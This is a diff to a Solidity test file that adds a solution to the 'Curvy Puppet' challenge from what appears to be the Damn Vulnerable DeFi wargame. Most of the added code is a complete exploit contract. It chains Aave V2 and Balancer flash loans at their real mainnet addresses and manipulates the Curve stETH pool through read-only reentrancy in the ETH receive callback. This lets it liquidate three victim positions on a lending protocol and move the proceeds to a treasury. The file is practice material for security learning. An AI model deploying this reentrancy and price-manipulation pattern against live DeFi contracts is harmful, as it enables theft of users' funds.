@@ -10,6 +10,192 @@ import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLend
 import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
 import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";
 
+interface ICurveStETH is IStableSwap {
+    function add_liquidity(uint256[2] calldata amounts, uint256 min_mint_amount)
+        external
+        payable
+        returns (uint256);
+
+    function remove_liquidity(uint256 amount, uint256[2] calldata min_amounts)
+        external
+        returns (uint256[2] memory);
+
+    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy)
+        external
+        payable
+        returns (uint256);
+}
+
+interface IAaveV2Pool {
+    function flashLoan(
+        address receiverAddress,
+        address[] calldata assets,
+        uint256[] calldata amounts,
+        uint256[] calldata modes,
+        address onBehalfOf,
+        bytes calldata params,
+        uint16 referralCode
+    ) external;
+}
+
+interface IBalancerVault {
+    function flashLoan(
+        address recipient,
+        address[] memory tokens,
+        uint256[] memory amounts,
+        bytes memory userData
+    ) external;
+}
+
+contract CurvyPuppetExploit {
+    IAaveV2Pool constant AAVE_V2 =
+        IAaveV2Pool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
+
+    IBalancerVault constant BALANCER =
+        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+
+    ICurveStETH immutable curvePool;
+    CurvyPuppetLending immutable lending;
+    IPermit2 immutable permit2;
+    IERC20 immutable lpToken;
+    IERC20 immutable stETH;
+    WETH immutable weth;
+    DamnValuableToken immutable dvt;
+    address immutable treasury;
+
+    address[3] victims;
+
+    constructor(
+        ICurveStETH _curvePool,
+        CurvyPuppetLending _lending,
+        IPermit2 _permit2,
+        IERC20 _lpToken,
+        IERC20 _stETH,
+        WETH _weth,
+        DamnValuableToken _dvt,
+        address _treasury,
+        address[3] memory _victims
+    ) {
+        curvePool = _curvePool;
+        lending = _lending;
+        permit2 = _permit2;
+        lpToken = _lpToken;
+        stETH = _stETH;
+        weth = _weth;
+        dvt = _dvt;
+        treasury = _treasury;
+        victims = _victims;
+    }
+
+    function attack() external {
+        lpToken.approve(address(permit2), type(uint256).max);
+
+        permit2.approve({
+            token: address(lpToken),
+            spender: address(lending),
+            amount: type(uint160).max,
+            expiration: type(uint48).max
+        });
+
+        stETH.approve(address(AAVE_V2), type(uint256).max);
+        weth.approve(address(AAVE_V2), type(uint256).max);
+
+        address[] memory assets = new address[](2);
+        assets[0] = address(stETH);
+        assets[1] = address(weth);
+
+        uint256[] memory amounts = new uint256[](2);
+        amounts[0] = 172_000e18; // stETH
+        amounts[1] = 20_500e18;  // WETH
+
+        uint256[] memory modes = new uint256[](2);
+        modes[0] = 0;
+        modes[1] = 0;
+
+        AAVE_V2.flashLoan(
+            address(this),
+            assets,
+            amounts,
+            modes,
+            address(this),
+            "",
+            0
+        );
+
+        weth.transfer(treasury, weth.balanceOf(address(this)));
+        lpToken.transfer(treasury, lpToken.balanceOf(address(this)));
+        dvt.transfer(treasury, dvt.balanceOf(address(this)));
+    }
+
+    function executeOperation(
+        address[] calldata,
+        uint256[] calldata,
+        uint256[] calldata,
+        address,
+        bytes calldata
+    ) external returns (bool) {
+        address[] memory tokens = new address[](1);
+        tokens[0] = address(weth);
+
+        uint256[] memory amounts = new uint256[](1);
+        amounts[0] = 37_991 ether;
+
+        BALANCER.flashLoan(address(this), tokens, amounts, "");
+
+        return true;
+    }
+
+    function receiveFlashLoan(
+        address[] memory,
+        uint256[] memory,
+        uint256[] memory,
+        bytes memory
+    ) external {
+        _addLiquidity();
+        _removeLiquidityAndTriggerReentrancy();
+
+        // Repay Balancer WETH flash loan
+        weth.deposit{value: 37_991 ether}();
+        weth.transfer(address(BALANCER), 37_991 ether);
+
+        // Convert ETH to stETH so Aave can pull stETH repayment
+        uint256 ethToSwap = 12_963_923_469_069_977_697_655;
+        curvePool.exchange{value: ethToSwap}(0, 1, ethToSwap, 1);
+
+        // Convert ETH to WETH so Aave can pull WETH repayment
+        weth.deposit{value: 20_518 ether}();
+    }
+
+    function _addLiquidity() private {
+        weth.withdraw(58_685 ether);
+
+        stETH.approve(address(curvePool), type(uint256).max);
+
+        uint256[2] memory amounts;
+        amounts[0] = 58_685 ether;
+        amounts[1] = stETH.balanceOf(address(this));
+
+        curvePool.add_liquidity{value: 58_685 ether}(amounts, 0);
+    }
+
+    function _removeLiquidityAndTriggerReentrancy() private {
+        uint256[2] memory minAmounts = [uint256(0), uint256(0)];
+
+        uint256 lpBalance = lpToken.balanceOf(address(this));
+
+        // Leave ~3 LP tokens for the 3 liquidations.
+        curvePool.remove_liquidity(lpBalance - (3e18 + 1), minAmounts);
+    }
+
+    receive() external payable {
+        if (msg.sender == address(curvePool)) {
+            for (uint256 i = 0; i < victims.length; i++) {
+                lending.liquidate(victims[i]);
+            }
+        }
+    }
+}
+
 contract CurvyPuppetChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -158,7 +344,26 @@ contract CurvyPuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_curvyPuppet() public checkSolvedByPlayer {
-        
+        IERC20 lpToken = IERC20(curvePool.lp_token());
+    
+        address[3] memory victims = [alice, bob, charlie];
+    
+        CurvyPuppetExploit exploit = new CurvyPuppetExploit(
+            ICurveStETH(address(curvePool)),
+            lending,
+            permit2,
+            lpToken,
+            stETH,
+            weth,
+            dvt,
+            treasury,
+            victims
+        );
+    
+        lpToken.transferFrom(treasury, address(exploit), TREASURY_LP_BALANCE);
+        weth.transferFrom(treasury, address(exploit), TREASURY_WETH_BALANCE);
+    
+        exploit.attack();
     }
 
     /**
